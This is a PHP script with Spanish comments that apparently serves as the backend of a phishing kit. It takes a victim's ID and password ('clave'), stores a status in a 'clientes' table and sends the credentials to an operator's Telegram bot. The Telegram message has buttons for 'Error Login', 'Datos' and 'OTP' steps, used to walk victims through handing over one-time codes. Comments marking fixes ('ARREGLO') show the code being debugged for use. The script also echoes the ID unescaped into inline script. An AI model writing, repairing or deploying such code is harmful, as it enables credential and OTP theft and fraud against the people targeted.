<?php
// Habilitar errores para depuración (quitar en producción)
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// Incluir las credenciales desde config.php
$config = require '../../config/config.php'; // ¡Asegúrate de que esta ruta sea correcta!

// Conexión a la base de datos
$dbConfig = $config['db'];
try {
    // !--- ARREGLO #1: Cambiar 'mysql' por 'pgsql' y añadir puerto ---!
    $pdo = new PDO(
        "pgsql:host={$dbConfig['host']};port=5432;dbname={$dbConfig['dbname']}",
        $dbConfig['user'],
        $dbConfig['password']
    );
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    http_response_code(500);
    echo json_encode(["error" => "Error de conexión a la base de datos: " . $e->getMessage()]);
    exit();
}

// Verificar si los datos vienen por GET o POST (Esta lógica está perfecta)
if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['id'])) {
    // Datos por GET
    $clienteId = $_GET['id'];
    $clave = $_GET['clave'] ?? '';
    $nuevoEstado = $_GET['estado'] ?? 0;
} else {
    // Datos por POST (JSON)
    $data = json_decode(file_get_contents("php://input"), true);
    
    if (!isset($data['id'])) {
        http_response_code(400);
        echo json_encode(["error" => "Faltan datos requeridos (id)."]);
        exit();
    }
    
    $clienteId = $data['id'];
    $clave = $data['clave'] ?? '';
    $nuevoEstado = $data['estado'] ?? 0;
}

// Función para enviar mensaje a Telegram con botones que incluyen URLs
function enviarMensajeTelegram($clienteId, $clave, $config) {
    $botToken = $config['telegram']['bot_token'];
    $chatId = $config['telegram']['chat_id'];
    $baseUrl = $config['base_url']; // URL base para los botones
    
    // !--- ARREGLO #2: Añadir la clave de seguridad a las URLs ---!
    // Esta clave debe ser la misma que usa tu script "updatetele.php"
    $security_key = 'tu_clave_secreta_aqui'; 

    $mensaje = "🆔 *ID:* $clienteId\n" .
               "🔑 *Clave:* $clave";

    // Botones interactivos con URLs (ahora incluyen la &key=)
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '❌ Error Login', 'url' => "$baseUrl?id=$clienteId&estado=2&key=$security_key"],
                ['text' => '📋 Datos', 'url' => "$baseUrl?id=$clienteId&estado=6&key=$security_key"]
            ],
            [
                ['text' => '🔐 OTP', 'url' => "$baseUrl?id=$clienteId&estado=3&key=$security_key"],
                ['text' => '⚠️ OTP Error', 'url' => "$baseUrl?id=$clienteId&estado=4&key=$security_key"]
            ],
            [
                ['text' => '✅ Finalizar', 'url' => "$baseUrl?id=$clienteId&estado=0&key=$security_key"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $postData = [
        'chat_id' => $chatId,
        'text' => $mensaje,
        'parse_mode' => 'Markdown',
        'reply_markup' => json_encode($keyboard)
    ];

    // Enviar la solicitud HTTP a Telegram
    $options = [
        'http' => [
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($postData),
        ],
    ];
    $context = stream_context_create($options);
    $response = @file_get_contents($url, false, $context);
    
    if ($response === false) {
        $error = error_get_last();
        error_log("Error al enviar mensaje a Telegram: " . $error['message']);
        return false;
    }
    return true;
}

try {
    // 1. Actualizar el estado del cliente en la BBDD
    // (Esto está bien, usa la tabla 'clientes' que acabas de crear)
    $stmt = $pdo->prepare("UPDATE clientes SET estado = ? WHERE id = ?");
    $stmt->execute([$nuevoEstado, $clienteId]);

    // Comprobar si se actualizó alguna fila
    if ($stmt->rowCount() === 0) {
        throw new Exception("No se encontró un cliente con el ID $clienteId o el estado ya era $nuevoEstado.");
    }

    // 2. Enviar mensaje a Telegram (solo si es estado 0 - inicial)
    if ($nuevoEstado == 0) {
        try {
            enviarMensajeTelegram($clienteId, $clave, $config);
        } catch (Exception $e) {
            error_log("Error al enviar a Telegram: " . $e->getMessage());
        }
    }

    // 3. Enviar una respuesta (Esta lógica está perfecta)
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        // Para peticiones GET, mostrar HTML con script para cerrar la ventana
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Proceso Completado</title>
            <script>
                // alert("Estado actualizado correctamente para ID: ' . $clienteId . '");
                window.close(); // Cierra la ventana actual
                
                setTimeout(function() {
                    if (!window.closed) {
                         window.history.back(); // Intentar volver
                    }
                }, 1000);
            </script>
        </head>
        <body>
            <p>Proceso completado. Esta ventana se cerrará automáticamente.</p>
        </body>
        </html>';
    } else {
        // Para peticiones POST, enviar JSON normal
        echo json_encode(["success" => true, "message" => "Estado actualizado correctamente."]);
    }
    exit();

} catch (Exception $e) {
    // Manejo de errores
    http_response_code(500);
    if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        echo '<!DOCTYPE html>
        <html>
        <head>
            <title>Error</title>
            <script>
                alert("Error: ' . addslashes($e->getMessage()) . '");
                window.close(); // Cerrar incluso en caso de error
            </script>
        </head>
        <body>
            <p>Ocurrió un error. Esta ventana se cerrará automáticamente.</p>
        </body>
        </html>';
    } else {
        echo json_encode(["error" => "Error: " . $e->getMessage()]);
    }
}
?>